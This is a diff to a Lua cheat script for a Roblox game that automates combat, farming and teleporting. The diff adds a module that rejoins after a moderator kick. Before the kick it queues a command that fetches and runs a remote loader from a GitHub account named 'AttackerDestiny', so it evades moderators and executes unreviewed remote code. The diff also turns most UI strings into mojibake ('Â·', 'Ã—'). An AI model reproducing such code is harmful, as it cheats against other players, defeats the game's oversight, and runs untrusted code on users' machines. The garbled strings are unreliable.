@@ -14,8 +14,8 @@ while not player do task.wait(.1);player=Players.LocalPlayer end
 local env = getgenv()
 local previousRuntime=env.SB2KillAura
 local previous=previousRuntime and previousRuntime.UserId==player.UserId and previousRuntime or nil
-local BUILD="2026-11-01.low-fps-v1.7.2"
-local VERSION="1.7.2"
+local BUILD="2026-11-01.moderator-rejoin-v1.7.3"
+local VERSION="1.7.3"
 local storageBootstrap=(function()
 -- BEGIN BUNDLED STORAGE BOOTSTRAP
 -- Executor paths are relative to its workspace; never add a second "workspace".
@@ -398,7 +398,7 @@ local state = {
     ProgressionBossCleared=restore.ProgressionBossCleared,ProgressionComplete=restore.ProgressionComplete,
     ProgressionBossClearedName=type(restore.ProgressionBossClearedName)=="string"and restore.ProgressionBossClearedName or nil,
     ProgressionRestore=restore.ProgressionRestore,ProgressionPhase="Loading",
-    AutoSaveStatus = filePersistence and "Auto-save · ready" or "Auto-save · file access unavailable",
+    AutoSaveStatus = filePersistence and "Auto-save Â· ready" or "Auto-save Â· file access unavailable",
 }
 do
     local profiles = preference("OffsetProfiles", {})
@@ -465,7 +465,7 @@ return function(state)
         if maximum==3 and cap>1 then
             local roll=(ctx.RandomInteger or math.random)(1,100)
             desired=math.min(cap,roll<=15 and 1 or roll<=45 and 2 or 3)
-            reason=reason.." · varied burst"
+            reason=reason.." Â· varied burst"
         end
         state.CurrentThreat, state.ThreatReason=desired,reason
         return desired,reason
@@ -570,7 +570,7 @@ return function(state)
             elseif record then snapshot(record,"Target unavailable"); active[mob]=nil; activeCount-=1 end
         end
         state.AttackBurstActive=activeCount>0
-        return #candidates>0 and string.format("Active · %d targets · %d requests",#candidates,state.HitsSent) or "Active · waiting for mobs"
+        return #candidates>0 and string.format("Active Â· %d targets Â· %d requests",#candidates,state.HitsSent) or "Active Â· waiting for mobs"
     end
     return api
 end
@@ -865,11 +865,11 @@ create("TextLabel",{Name="Version",Text="v"..state.Version,BackgroundTransparenc
 create("TextLabel",{Name="Title",Text="Main",BackgroundTransparency=1,Position=UDim2.fromOffset(14,28),
     Size=UDim2.fromOffset(220,26),Font=Enum.Font.GothamBold,TextSize=21,TextXAlignment=Enum.TextXAlignment.Left,
     TextColor3=Color3.fromRGB(233,235,246)},panel)
-local close=create("TextButton",{Name="Close",Text="×",Font=Enum.Font.Gotham,TextSize=22,
+local close=create("TextButton",{Name="Close",Text="Ã—",Font=Enum.Font.Gotham,TextSize=22,
     Size=UDim2.fromOffset(30,30),Position=UDim2.new(1,-42,0,12),BackgroundColor3=Color3.fromRGB(34,37,49),
     BorderSizePixel=0,TextColor3=Color3.fromRGB(188,192,210)},panel)
 corner(close,8)
-local hideUI=create("TextButton",{Name="HideUI",Text="−",Font=Enum.Font.GothamBold,TextSize=20,
+local hideUI=create("TextButton",{Name="HideUI",Text="âˆ’",Font=Enum.Font.GothamBold,TextSize=20,
     Size=UDim2.fromOffset(30,30),Position=UDim2.new(1,-78,0,12),BackgroundColor3=Color3.fromRGB(34,37,49),
     BorderSizePixel=0,TextColor3=Color3.fromRGB(188,192,210)},panel)
 corner(hideUI,8)
@@ -917,10 +917,10 @@ local function revealOptions(options)
         end
     end)
 end
-local toggle=uiButton("Toggle","Kill aura · OFF",10,38)
-local farmToggle=uiButton("AutoFarm","Auto farm · OFF",20,34)
-local dodgeToggle=uiButton("AutoDodge","Auto dodge · ON",10,34)
-create("TextLabel",{Name="Hint",Text="Right Shift · show / hide",BackgroundTransparency=1,Position=UDim2.new(0,14,1,-20),
+local toggle=uiButton("Toggle","Kill aura Â· OFF",10,38)
+local farmToggle=uiButton("AutoFarm","Auto farm Â· OFF",20,34)
+local dodgeToggle=uiButton("AutoDodge","Auto dodge Â· ON",10,34)
+create("TextLabel",{Name="Hint",Text="Right Shift Â· show / hide",BackgroundTransparency=1,Position=UDim2.new(0,14,1,-20),
     Size=UDim2.new(1,-28,0,14),Font=Enum.Font.Gotham,TextSize=10,TextColor3=Color3.fromRGB(111,121,148),
     TextXAlignment=Enum.TextXAlignment.Left},panel)
 local savePending, lastSettingsEdit = false, 0
@@ -972,13 +972,13 @@ function state.SaveNow()
         if not sharedOK then ok=false;result=reason end
     end
     if ok then state.ConfigSaveError = nil else state.ConfigSaveError = tostring(result) end
-    state.AutoSaveStatus = ok and "Auto-save · saved" or "Auto-save · write failed"
+    state.AutoSaveStatus = ok and "Auto-save Â· saved" or "Auto-save Â· write failed"
     return ok
 end
 requestSave = function()
     if not configReady or not filePersistence or not state.Running or state.AutoSaveSuspended then return end
     lastSettingsEdit = os.clock()
-    state.AutoSaveStatus = "Auto-save · pending"
+    state.AutoSaveStatus = "Auto-save Â· pending"
     if savePending then return end
     savePending = true
     task.spawn(function()
@@ -1224,7 +1224,7 @@ enemyHUD=healthHUD.Root
 local function trackHealth(mob) healthHUD.Focus(mob) end
 
 uiLabel("SkillHeading","SKILL AURA",50,16,true)
-local skillToggle=uiButton("SkillAura","Skill aura · OFF",60,34)
+local skillToggle=uiButton("SkillAura","Skill aura Â· OFF",60,34)
 local skillDropdown=uiButton("SkillDropdown",state.SelectedSkill.."  v",70,32)
 skillDropdown.Font=Enum.Font.Gotham
 local skillList=create("ScrollingFrame",{Name="SkillOptions",Visible=false,LayoutOrder=80,Size=UDim2.new(1,0,0,138),
@@ -1262,7 +1262,7 @@ function state.SetSkillAura(enabled)
     state.SkillAura = enabled == true
     if state.WakeSkillAura then state.WakeSkillAura() end
     if not state.SkillAura and state.CancelSkillAura then state.CancelSkillAura("Skill aura disabled") end
-    skillToggle.Text = state.SkillAura and "Skill aura · ON" or "Skill aura · OFF"
+    skillToggle.Text = state.SkillAura and "Skill aura Â· ON" or "Skill aura Â· OFF"
     skillToggle.BackgroundColor3 = state.SkillAura and Color3.fromRGB(114, 88, 229) or Color3.fromRGB(45, 48, 63)
     state.SkillStatus = state.SkillAura and "Waiting for a nearby enemy" or "Skill aura is off"
     requestSave()
@@ -1311,11 +1311,11 @@ do
         end
     end
     toggle.Parent=pages.Combat; farmToggle.Parent=pages.Combat
-    state.UI.AtheonDodge=uiButton("AtheonDodge","Atheon Dodge · OFF",30,34,pages.Combat)
+    state.UI.AtheonDodge=uiButton("AtheonDodge","Atheon Dodge Â· OFF",30,34,pages.Combat)
     function state.SetAtheonDodge(on)
         state.AtheonDodge=on==true
         local button=state.UI.AtheonDodge
-        button.Text=state.AtheonDodge and "Atheon Dodge · ON" or "Atheon Dodge · OFF"
+        button.Text=state.AtheonDodge and "Atheon Dodge Â· ON" or "Atheon Dodge Â· OFF"
         button.BackgroundColor3=state.AtheonDodge and Color3.fromRGB(91,72,164) or Color3.fromRGB(38,41,56)
         if not state.AtheonDodge and state.AtheonDodgeController then state.AtheonDodgeController.Reset() end
         requestSave()
@@ -1355,7 +1355,7 @@ do
     end
     local miscHeading=uiLabel("MiscSkillHeading","MISC SKILL",90,16,true)
     miscHeading.Parent=pages["Auto Skill"]
-    state.UI.MiscSkillToggle=uiButton("MiscSkillToggle","Misc Skill · OFF",100,34,pages["Auto Skill"])
+    state.UI.MiscSkillToggle=uiButton("MiscSkillToggle","Misc Skill Â· OFF",100,34,pages["Auto Skill"])
     state.UI.MiscSkillDropdown=uiButton("MiscSkillDropdown",state.SelectedMiscSkill.."  v",110,32,pages["Auto Skill"])
     state.UI.MiscSkillDropdown.Font=Enum.Font.Gotham
     state.UI.MiscSkillOptions=create("ScrollingFrame",{Name="MiscSkillOptions",Visible=false,LayoutOrder=120,Size=UDim2.new(1,0,0,116),
@@ -1405,8 +1405,8 @@ do
     create("UIListLayout",{Padding=UDim.new(0,3),SortOrder=Enum.SortOrder.LayoutOrder},state.UI.PlayerOptions)
     create("UIPadding",{PaddingTop=UDim.new(0,5),PaddingBottom=UDim.new(0,5),PaddingLeft=UDim.new(0,5),PaddingRight=UDim.new(0,5)},state.UI.PlayerOptions)
     state.UI.TeleportPlayer=uiButton("TeleportPlayer","TP to player",30,34,pages.Player)
-    state.UI.ViewPlayer=uiButton("ViewPlayer","View player · OFF",40,34,pages.Player)
-    state.UI.ViewInventory=uiButton("ViewInventory","View player inventory · OFF",50,34,pages.Player)
+    state.UI.ViewPlayer=uiButton("ViewPlayer","View player Â· OFF",40,34,pages.Player)
+    state.UI.ViewInventory=uiButton("ViewInventory","View player inventory Â· OFF",50,34,pages.Player)
     state.UI.PlayerInventory=create("ScrollingFrame",{Name="PlayerInventory",Visible=false,LayoutOrder=60,Size=UDim2.new(1,0,0,180),
         BackgroundColor3=Color3.fromRGB(27,30,43),BorderSizePixel=0,ScrollBarThickness=3,
         CanvasSize=UDim2.new(),AutomaticCanvasSize=Enum.AutomaticSize.Y,ClipsDescendants=true},pages.Player)
@@ -1969,7 +1969,7 @@ function state.ResolveAutoOffset(mob)
         activeOffsetMob=mob
         offsetSample={Offset=plan.Offset,Key=key,Requests=data.OffsetRequests or 0,At=now,
             SafeSince=now,PlayerHealth=playerHealth and playerHealth.Value,OwnDamage=state.ReadOwnDamage(data.Health),Misses=0,Confirmed=false}
-        state.OffsetStatus="Source outer reach · checking clearance"
+        state.OffsetStatus="Source outer reach Â· checking clearance"
     end
     if math.abs(plan.Offset-offsetSample.Offset)>.75 then
         offsetSample.SafeSince=now; offsetSample.Confirmed=false; offsetSample.Offset=plan.Offset
@@ -1994,7 +1994,7 @@ function state.ResolveAutoOffset(mob)
         elseif requests-offsetSample.Requests>=3 and not state.SkillCastRunning and not state.Recovering
             and now>=state.LagPauseUntil and (not state.PingMs or state.PingMs<=500) then
             offsetSample.Misses+=1
-            state.OffsetStatus="No damage · holding outer clearance"
+            state.OffsetStatus="No damage Â· holding outer clearance"
             if offsetSample.Misses>=3 then
                 data.SkipUntil=now+8
                 state.FollowTarget=nil
@@ -2086,7 +2086,7 @@ stopMovement = function(message, keepPosition)
         task.delay(0.3, function()
             exitCollisionConnection:Disconnect()
             cleanup()
-            if state.Running then movementStatus(state.LastFarmStopReason or message or "Stopped · character controls restored") end
+            if state.Running then movementStatus(state.LastFarmStopReason or message or "Stopped Â· character controls restored") end
         end)
     else
         cleanup()
@@ -2097,7 +2097,7 @@ stopMovement = function(message, keepPosition)
     correctionStrikes, correctionTarget, holdPaused = 0, nil, false
     state.Exploring, state.LastExploreDestination = false, nil
     state.Moving = false
-    if message then movementStatus(state.Recovering and "Returning above ground…" or message) end
+    if message then movementStatus(state.Recovering and "Returning above groundâ€¦" or message) end
 end
 do
     local make=(function()
@@ -2165,7 +2165,7 @@ function state.SetAutoFarm(enabled, reason)
     state.AutoFarm = enabled == true
     if state.AutoFarm then state.LastFarmStopReason = nil end
     state.LastMovementError = nil
-    farmToggle.Text = state.AutoFarm and "Auto farm  ·  ON" or "Auto farm  ·  OFF"
+    farmToggle.Text = state.AutoFarm and "Auto farm  Â·  ON" or "Auto farm  Â·  OFF"
     farmToggle.BackgroundColor3 = state.AutoFarm and Color3.fromRGB(114, 88, 229) or Color3.fromRGB(45, 48, 63)
     stopMovement(state.AutoFarm and "Searching for the nearest living mob" or "Auto farm is off")
     state.FollowTarget = nil
@@ -3270,7 +3270,7 @@ state.WaveDodge = waveDodge
 function state.SetAutoDodge(enabled)
     if state.StopEverything and enabled==true then return false end
     state.AutoDodge = enabled == true
-    dodgeToggle.Text = state.AutoDodge and "Auto dodge · ON" or "Auto dodge · OFF"
+    dodgeToggle.Text = state.AutoDodge and "Auto dodge Â· ON" or "Auto dodge Â· OFF"
     dodgeToggle.BackgroundColor3 = state.AutoDodge and Color3.fromRGB(91,72,164) or Color3.fromRGB(45,48,63)
     requestSave()
 end
@@ -3860,7 +3860,7 @@ function state.RegisterAutomationDestination(spot)
     rememberDestination(spot.DestinationId,spot.Name,spot.Kind,spot.Position)
     return true
 end
-travelHeading.Text = "TELEPORTS · " .. floorName
+travelHeading.Text = "TELEPORTS Â· " .. floorName
 travelHeading.TextTruncate = Enum.TextTruncate.AtEnd
 
 do
@@ -4021,7 +4021,7 @@ function state.TeleportToDestination(id,urgent,automatic)
     setTravelOpen(false)
     -- Prevent continuous skills from taking a new lease before travel gets a turn.
     if automatic and state.CancelSkillAura then state.CancelSkillAura("Moving to next selected arena") end
-    stopMovement("Travelling · farming will resume",true)
+    stopMovement("Travelling Â· farming will resume",true)
     task.spawn(function()
         local function current()return state.Running and not state.SafeModePanic and not state.StopEverything and state.TravelSerial==serial end
         local ok,message=pcall(function()
@@ -4043,7 +4043,7 @@ function state.TeleportToDestination(id,urgent,automatic)
                 state.TravelFocus={Kind=area.Kind,Name=id:sub(1,4)=="mob:" and area.Name or nil,Until=os.clock()+8}
                 state.FollowTarget=nil
             end
-            setTravelStatus("Arrived: "..area.Name.." · 20 studs below position")
+            setTravelStatus("Arrived: "..area.Name.." Â· 20 studs below position")
             if automatic and state.MultiSpotController and state.MultiSpotController.Current then
                 local _,seen=state.ReadAutomationEncounter(state.MultiSpotController.Current)
                 if seen then state.MultiSpotController.EncounterSeen=true end
@@ -4078,10 +4078,10 @@ local function refreshTravelChoices()
         button.Activated:Connect(callback)
     end
     for index, area in ipairs(choices) do
-        option(area.Kind .. " · " .. area.Name, index, function() state.TeleportToDestination(area.Id) end)
+        option(area.Kind .. " Â· " .. area.Name, index, function() state.TeleportToDestination(area.Id) end)
     end
     if not hasMini then
-        option("Mini boss · area not discovered yet", 100, function() setTravelStatus("Visit the mini-boss area once, then save it below") end)
+        option("Mini boss Â· area not discovered yet", 100, function() setTravelStatus("Visit the mini-boss area once, then save it below") end)
         option("Save current spot as mini-boss area", 101, function()
             local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
             if root then rememberDestination("saved:mini", "Saved mini-boss area", "Mini boss", root.Position); saveDestinations(); refreshTravelChoices(); setTravelStatus("Mini-boss area saved for " .. floorName) end
@@ -4108,7 +4108,7 @@ local function freshExplorePoint(position)
     return true
 end
 local function exploreEmptyArea(character, root, humanoid, now)
-    if now < nextExploreAt then movementStatus("Exploring · waiting for the new area to load"); return end
+    if now < nextExploreAt then movementStatus("Exploring Â· waiting for the new area to load"); return end
     local destination, hint
     local best = 1500 * 1500
     for mob in pairs(trackedMobs) do
@@ -4148,7 +4148,7 @@ local function exploreEmptyArea(character, root, humanoid, now)
             end
         end
     end
-    if not destination then nextExploreAt = now + 2; movementStatus("Exploring paused · no safe destination found"); return end
+    if not destination then nextExploreAt = now + 2; movementStatus("Exploring paused Â· no safe destination found"); return end
     exploredCenters[#exploredCenters + 1] = root.Position
     if #exploredCenters > 8 then table.remove(exploredCenters, 1) end
     ensureMovementController(character, root, humanoid, destination)
@@ -4170,7 +4170,7 @@ local function exploreEmptyArea(character, root, humanoid, now)
     targetMissingSince = now
     state.AttackingTarget = nil
     trackHealth(nil)
-    movementStatus("Exploring · moved beyond the previous spawn area")
+    movementStatus("Exploring Â· moved beyond the previous spawn area")
 end
 
 local function updateMovement()
@@ -4223,9 +4223,9 @@ local function updateMovement()
         teleportTarget = nil
         state.OffsetGraceUntil = now + 0.5
     end
-    if now < state.LagPauseUntil or (state.PingMs and state.PingMs > 500) then pauseHold("Paused in place · waiting for lag"); return end
-    if root.Anchored or humanoid.SeatPart then stopMovement("Paused · character cannot move"); return end
-    if character:GetAttribute("Disabled") then pauseHold("Paused in place · character disabled"); return end
+    if now < state.LagPauseUntil or (state.PingMs and state.PingMs > 500) then pauseHold("Paused in place Â· waiting for lag"); return end
+    if root.Anchored or humanoid.SeatPart then stopMovement("Paused Â· character cannot move"); return end
+    if character:GetAttribute("Disabled") then pauseHold("Paused in place Â· character disabled"); return end
     if holdPaused then
         holdPaused = false
         teleportTarget = nil
@@ -4251,20 +4251,20 @@ local function updateMovement()
     if not targetRoot then
         if state.AccountProgression and state.ProgressionAnchor then
             state.FollowTarget=nil;waveDodge.Idle(state.ProgressionAnchor)
-            movementStatus("Account Progression · waiting for the main boss");return
+            movementStatus("Account Progression Â· waiting for the main boss");return
         end
         if state.MultiSpot and state.MultiSpotAnchor then
             state.FollowTarget=nil
             if not state.HoldMultiSpotIdle() then waveDodge.Idle() end
-            movementStatus("Multi Spot · waiting for selected arena mobs");return
+            movementStatus("Multi Spot Â· waiting for selected arena mobs");return
         end
         state.AutoOffsetTarget,state.AutoOffsetDestination = nil,nil
         activeOffsetMob, offsetSample = nil, nil
         targetMissingSince = targetMissingSince or now
         if now - targetMissingSince > 0.9 then
             waveDodge.Idle()
-            movementStatus("No target in "..state.FarmRange.." studs · idle -20")
-        else waveDodge.Idle(); movementStatus("Waiting below the map · 20 studs") end
+            movementStatus("No target in "..state.FarmRange.." studs Â· idle -20")
+        else waveDodge.Idle(); movementStatus("Waiting below the map Â· 20 studs") end
         return
     end
     targetMissingSince = nil
@@ -4276,7 +4276,7 @@ local function updateMovement()
     if not autoOffset or not state.AutoFarm or state.TravelBusy then return end
     local destination = state.AutoOffsetDestination or targetRoot.Position + Vector3.new(0, autoOffset, 0)
     lastSurfaceY = targetRoot.Position.Y + 3
-    if destination.Y <= workspace.FallenPartsDestroyHeight + 30 then stopMovement("Paused · destination is too low"); return end
+    if destination.Y <= workspace.FallenPartsDestroyHeight + 30 then stopMovement("Paused Â· destination is too low"); return end
     if teleportTarget == state.FollowTarget and positionAlign and now > (state.OffsetGraceUntil or 0) and now - lastTeleportTime > 0.2 then
         local errorDistance = (root.Position - positionAlign.Position).Magnitude
         local tolerance = math.max(5, math.min(12, targetRoot.AssemblyLinearVelocity.Magnitude * 0.25 + 3))
@@ -4815,7 +4815,7 @@ function state.SetEnabled(enabled)
     if not state.Running then return end
     state.Enabled = enabled == true
     if state.Enabled then state.AutoSwing=true end
-    if not state.Enabled then finishAttackBurst("Paused"); stopSword(); stopMovement("Aura paused · movement stopped") end
+    if not state.Enabled then finishAttackBurst("Paused"); stopSword(); stopMovement("Aura paused Â· movement stopped") end
     state.LastError = nil
     consecutiveErrors = 0
     nextAttack = 0
@@ -4824,7 +4824,7 @@ function state.SetEnabled(enabled)
     noDamageChecks = 0
     table.clear(lastHit)
     table.clear(pendingDamage)
-    toggle.Text = state.Enabled and "Kill aura · ON" or "Kill aura · OFF"
+    toggle.Text = state.Enabled and "Kill aura Â· ON" or "Kill aura Â· OFF"
     toggle.BackgroundColor3 = state.Enabled and Color3.fromRGB(114, 88, 229) or Color3.fromRGB(45, 48, 63)
     requestSave()
 end
@@ -5111,10 +5111,10 @@ local function scan()
         local ok, ping = pcall(function() return Stats.Network.ServerStatsItem["Data Ping"]:GetValue() end)
         state.PingMs = ok and type(ping) == "number" and ping or nil
     end
-    if now < state.LagPauseUntil or (state.PingMs and state.PingMs > 500) then stopSword(); return "Paused · waiting for lag to clear" end
-    if state.Recovering then stopSword(); return "Returning to ground…" end
-    if state.SkillPreparing or state.SkillCastRunning or now<(state.CombatReadyAt or 0) then stopSword(); return "Skill aura · skill hit window" end
-    if character:GetAttribute("Disabled") then stopSword(); return "Paused · character disabled" end
+    if now < state.LagPauseUntil or (state.PingMs and state.PingMs > 500) then stopSword(); return "Paused Â· waiting for lag to clear" end
+    if state.Recovering then stopSword(); return "Returning to groundâ€¦" end
+    if state.SkillPreparing or state.SkillCastRunning or now<(state.CombatReadyAt or 0) then stopSword(); return "Skill aura Â· skill hit window" end
+    if character:GetAttribute("Disabled") then stopSword(); return "Paused Â· character disabled" end
     stopSword()
     if swingThread or Actions.IsSwinging() then return "Finishing sword swing" end
     if now >= nextTargetRefresh then
@@ -5258,7 +5258,7 @@ local function runFrame()
             state.FarmPauseUntil = os.clock() + 1
             state.FollowTarget = nil
             state.LastMovementError = tostring(movementError)
-            movementStatus("Paused · movement error")
+            movementStatus("Paused Â· movement error")
             warn("[SB2 Auto Farm] " .. tostring(movementError))
         end
         local uprightOK,uprightError=pcall(state.UprightController.Update)
@@ -5271,7 +5271,7 @@ local function runFrame()
         if not skillOK then
             state.SkillRetryAt=os.clock()+1.5
             state.LastSkillError = tostring(skillError)
-            state.SkillStatus = "Skill retry · waiting for game state"
+            state.SkillStatus = "Skill retry Â· waiting for game state"
             warn("[SB2 Skill Aura] " .. tostring(skillError))
         end
         local ok, message = pcall(scan)
@@ -5288,7 +5288,7 @@ local function runFrame()
                 state.FarmPauseUntil = os.clock()+1
                 consecutiveErrors = 0
                 state.LastError = tostring(message)
-                combatStatus = "Recovering combat · auto farm stays enabled"
+                combatStatus = "Recovering combat Â· auto farm stays enabled"
                 warn("[SB2 Kill Aura] " .. tostring(message))
             end
         end
@@ -5488,6 +5488,53 @@ end
 
 -- END BUNDLED MODERATOR WATCH
     end)()
+    local makeRejoin=(function()
+-- BEGIN BUNDLED MODERATOR REJOIN
+-- Armed only by the confirmed moderator-block path, never by arbitrary kicks.
+return function(ctx)
+    local api={Armed=false,Attempts=0}
+    function api.Kick(message)
+        if api.Armed then return end
+        api.Armed=true
+        local active=function()return ctx.State.Running~=false and not ctx.State.StopEverything end
+        local ok,err=pcall(ctx.Queue)
+        if not ok then ctx.State.ModeratorRejoinError="Resume queue: "..tostring(err)end
+        -- Start the worker before Kick: some executors throw when Kick returns.
+        ctx.Spawn(function()
+            ctx.Sleep(1)
+            for attempt=1,3 do
+                if not active()or api.Started then return end
+                api.Attempts=attempt
+                ctx.State.ModeratorRejoinStatus="Rejoining current floor · attempt "..attempt
+                local sent,reason=pcall(ctx.Teleport)
+                if not sent then ctx.State.ModeratorRejoinError=tostring(reason)end
+                ctx.Sleep(8)
+            end
+            if active()and not api.Started then
+                ctx.State.ModeratorRejoinStatus="Automatic rejoin did not start · rejoin manually"
+            end
+        end)
+        ctx.Kick(message)
+    end
+    function api.MarkStarted()api.Started=true end
+    return api
+end
+
+-- END BUNDLED MODERATOR REJOIN
+    end)()
+    local teleportService=game:GetService("TeleportService")
+    local rejoin=makeRejoin({State=state,Spawn=task.spawn,Sleep=task.wait,
+        Queue=function()
+            local queue=queue_on_teleport or queueonteleport or (syn and syn.queue_on_teleport) or (fluxus and fluxus.queue_on_teleport)
+            assert(type(queue)=="function","Executor has no teleport queue")
+            queue('loadstring(game:HttpGet("https://raw.githubusercontent.com/AttackerDestiny/balls/main/loader.luau"))()')
+        end,
+        Teleport=function()teleportService:Teleport(game.PlaceId,player)end,
+        Kick=function(message)player:Kick(message)end})
+    state.ModeratorRejoin=rejoin
+    bind(player.OnTeleport,function(phase)
+        if phase==Enum.TeleportState.Started or phase==Enum.TeleportState.InProgress then rejoin.MarkStarted()end
+    end)
     state.ModeratorWatch=create({State=state,Players=Players,Save=state.SaveNow,
         Pause=function()
             if state.SoloServerSearch and state.SoloServerSearch.Active then pcall(state.SoloServerSearch.Stop,"Moderator detection has priority")end
@@ -5495,7 +5542,7 @@ end
             finishAttackBurst("Moderator detected");stopSword(true)
             if state.CancelSkillAura then state.CancelSkillAura("Moderator detected")end
             if state.CancelMiscSkill then state.CancelMiscSkill()end
-            stopMovement("Moderator detected · blocking before disconnect",true)
+            stopMovement("Moderator detected Â· blocking before disconnect",true)
             if state.FarmNoclip then state.FarmNoclip.Update()end
             if state.PanicToSpawn then state.PanicToSpawn()end
         end,
@@ -5510,7 +5557,7 @@ end
             state.SafeModeStatus=message;state.MultiSpotStatus=message;state.ProgressionStatus=message
             movementStatus(message)
         end,
-        Kick=function(message)player:Kick(message)end})
+        Kick=rejoin.Kick})
 end
 bind(player.OnTeleport, function(teleportState)
     if teleportState == Enum.TeleportState.Started or teleportState == Enum.TeleportState.InProgress then state.SaveNow() end
@@ -5532,8 +5579,8 @@ do
         if not tools or not state.Running then return end
         local selected=tools.GetSelected()
         ui.PlayerSelector.Text=selected and (selected.DisplayName==selected.Name and "@"..selected.Name or selected.DisplayName.." (@"..selected.Name..")") or "Select player"
-        ui.ViewPlayer.Text=tools.Viewing and "View player · ON" or "View player · OFF"
-        ui.ViewInventory.Text=tools.InventoryVisible and "View player inventory · ON" or "View player inventory · OFF"
+        ui.ViewPlayer.Text=tools.Viewing and "View player Â· ON" or "View player Â· OFF"
+        ui.ViewInventory.Text=tools.InventoryVisible and "View player inventory Â· ON" or "View player inventory Â· OFF"
         ui.ViewPlayer.BackgroundColor3=tools.Viewing and Color3.fromRGB(114,88,229) or Color3.fromRGB(38,41,56)
         ui.ViewInventory.BackgroundColor3=tools.InventoryVisible and Color3.fromRGB(114,88,229) or Color3.fromRGB(38,41,56)
         ui.PlayerInventory.Visible=tools.InventoryVisible
@@ -5738,7 +5785,7 @@ end
             end
             if reason or #rows==0 then row(reason or "No inventory items",1)
             else for index,item in ipairs(rows) do
-                row(item.Name..(item.Upgrade>0 and " +"..item.Upgrade or "")..(item.Count>1 and " ×"..item.Count or ""),index)
+                row(item.Name..(item.Upgrade>0 and " +"..item.Upgrade or "")..(item.Count>1 and " Ã—"..item.Count or ""),index)
             end end
             state.ViewedInventoryCount=#rows
         end,
@@ -5844,7 +5891,7 @@ do
         if enabled and state.StopEverything then return false end
         state.MiscSkillEnabled=enabled==true
         if not enabled then state.MiscReserveStamina=false end
-        state.UI.MiscSkillToggle.Text=state.MiscSkillEnabled and "Misc Skill · ON" or "Misc Skill · OFF"
+        state.UI.MiscSkillToggle.Text=state.MiscSkillEnabled and "Misc Skill Â· ON" or "Misc Skill Â· OFF"
         state.UI.MiscSkillToggle.BackgroundColor3=state.MiscSkillEnabled and Color3.fromRGB(114,88,229) or Color3.fromRGB(38,41,56)
         requestSave()
     end
@@ -5966,7 +6013,7 @@ function state.PanicToSpawn()
         if state.CancelSkillAura then state.CancelSkillAura("Safe Mode panic") end
         if state.CancelMiscSkill then state.CancelMiscSkill() end
         if state.MultiSpotController then state.MultiSpotController.Reset() end
-        stopMovement("Safe Mode · holding at spawn",true)
+        stopMovement("Safe Mode Â· holding at spawn",true)
         state.FollowTarget=nil;state.TravelFocus=nil
     end
     local character=player.Character
@@ -5997,7 +6044,7 @@ end
 function state.ReleaseSafePanic()
     if not state.SafeModePanic then return end
     state.SafeModePanic=false;state.SafePanicPosition=nil
-    stopMovement("Safe Mode · server protected",true)
+    stopMovement("Safe Mode Â· server protected",true)
     state.FollowTarget=nil
 end
 
@@ -6113,7 +6160,7 @@ return function(ctx)
         if #others == 0 then
             soloSince = soloSince or ctx.Clock()
             if ctx.Clock() - soloSince >= (ctx.SoloSeconds or 8) then
-                api.Stop("Protected · only you and whitelisted players", "Safe")
+                api.Stop("Protected Â· only you and whitelisted players", "Safe")
             end
             return
         end
